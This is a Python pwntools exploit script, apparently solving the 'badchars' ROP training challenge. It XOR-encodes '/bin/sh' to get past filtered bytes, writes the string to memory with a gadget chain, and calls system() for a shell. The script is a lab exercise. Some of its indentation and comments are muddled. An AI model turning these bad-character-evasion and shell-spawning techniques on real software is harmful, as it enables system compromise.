from pwn import *
import pdb

def encodeString(inputString, xorByte):
    inputStringBytes = bytearray(inputString)

    encodedString = ""

    for c in inputStringBytes:
        xorVal = c ^ xorByte
        encodedString += chr(xorVal)
    #pdb.set_trace()
    return encodedString

def padString(inputString, width):
	if len(inputString) % width == 0:
       		inputString += "\x00" * width
    	else:
        	inputString += (width-(len(inputString)%width)) * "\x00"
        return inputString

def getGoodCharacters():
    goodchars = ""
    for i in range(1,256): # we cannot use the \x00 byte, since it is the string delimiter and therefore a *natural* bad character
        char = chr(i)
        if char in badchars:
            continue
        else:
            goodchars += char
    return goodchars

def RopChainHelper(inputString, location):
    payload = ""

    paddedString = padString(inputString,8)
    xorChar = -1
    encodedString = paddedString

    if containsBadCharacters(encodedString) == True:

        goodChars = getGoodCharacters()
        goodCharsList = list(goodChars)

        while containsBadCharacters(encodedString) == True:
            if len(goodCharsList) == 0:
                exit() # we have no more good characters, giving up...

            xorChar = ord(goodCharsList.pop())
            encodedString = encodeString(paddedString,xorChar)
            #pdb.set_trace()
    # we have found a character encoding without bad characters.
    # Save the (encoded) string to memory

    for i in range(0,len(encodedString),8):
        payload += p64(pop_r12_r13)
        payload += encodedString[i:i+8] # will be stored in r12
        payload += p64(location+i) # will be stored in r13
        payload += p64(mov_r13_r12)





    # Decode string, if necessary
    if xorChar != -1:
        for i in range(0,len(encodedString)):
            payload += p64(pop_r14_r15)
            payload += chr(xorChar) * 8 # will be stored in r15, we actually only need the lowest byte
            payload += p64(location+i) # will be stored in r14
            payload += p64(xor_byte_r15)




    return payload


def containsBadCharacters(inputString):
    for c in badchars:
        if c in inputString:
            return True

    return False


crap = "A" * 40
badchars = "bic/ fns"

goodchars = getGoodCharacters()

'''

conversions:
'b' -> 0xeb
'i' -> 0xeb
'c' -> 0xeb
'/' -> 0xeb
' ' -> 0xeb
'f' -> 0xeb
'n' -> 0xeb
's' -> 0xeb

'''

e = ELF("./badchars")


call_system = e.symbols["plt.system"]
xor_byte_r15 = e.symbols["usefulGadgets"]+0 # usefulGadgets + 0 -- xor BYTE PTR [r15],r14b; ret
mov_r13_r12 = e.symbols["usefulGadgets"]+4# usefulGadgets + 4 -- mov    QWORD PTR [r13+0x0],r12; ret
pop_r12_r13 = e.symbols["usefulGadgets"]+11 # usefulGadgets + 11 -- pop r12; pop r13; ret
pop_r14_r15 = e.symbols["usefulGadgets"]+16 # usefulGadgets + 16 -- pop r14; pop r15; ret
pop_rdi = e.symbols["usefulGadgets"]+9 # usefulGadgets + 9 -- pop rdi; ret
data_section = e.get_section_by_name(".bss").header.sh_addr




command = "/bin/sh"
payload = crap

payload += RopChainHelper(command,data_section)


payload += p64(pop_rdi)
payload += p64(data_section)
payload += p64(call_system)

print(payload)
if len(payload) > 512:
	exit("Payload size is limited to 512 bytes, choose a shorter command string!")




io = e.process()

#gdb.attach(io, '''
#break *0x00000000004006f0
#''')

io.sendline(payload)

io.interactive()
